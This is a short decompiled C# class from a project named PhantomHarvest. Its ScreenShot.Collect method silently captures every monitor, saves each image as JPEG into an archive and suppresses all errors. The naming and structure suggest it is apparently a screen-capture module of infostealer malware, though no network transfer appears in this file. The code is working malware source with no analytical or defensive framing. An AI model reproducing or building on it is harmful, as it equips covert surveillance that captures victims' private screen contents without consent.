using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;
using PhantomHarvest.Helper;

namespace PhantomHarvest.SystemInfos
{
	// Token: 0x02000010 RID: 16
	internal class ScreenShot
	{
		public static void Collect(ArchiveManager zip)
		{
			try
			{
				try
				{
					Win32Api.SetProcessDPIAware();
				}
				catch
				{
				}
				if (Screen.AllScreens.Length != 0)
				{
					for (int i = 0; i < Screen.AllScreens.Length; i++)
					{
						try
						{
							Screen screen = Screen.AllScreens[i];
							using (Bitmap bitmap = new Bitmap(screen.Bounds.Width, screen.Bounds.Height, PixelFormat.Format32bppArgb))
							{
								using (Graphics graphics = Graphics.FromImage(bitmap))
								{
									graphics.CopyFromScreen(screen.Bounds.Left, screen.Bounds.Top, 0, 0, new Size(bitmap.Width, bitmap.Height), CopyPixelOperation.SourceCopy);
								}
								using (MemoryStream ms = new MemoryStream())
								{
									bitmap.Save(ms, ImageFormat.Jpeg);
									ms.Position = 0; // Reset position for reading
									zip.AddStream(ArchiveManager.Compression.Deflate, ScreenShot.SystemInfoName + "/ScreenShot" + i.ToString() + ".jpg", ms, DateTime.Now, "");
								}
							}
						}
						catch {}
					}
				}
			}
			catch
			{
			}
		}

		public static string SystemInfoName = "ScreenShot";
	}
}
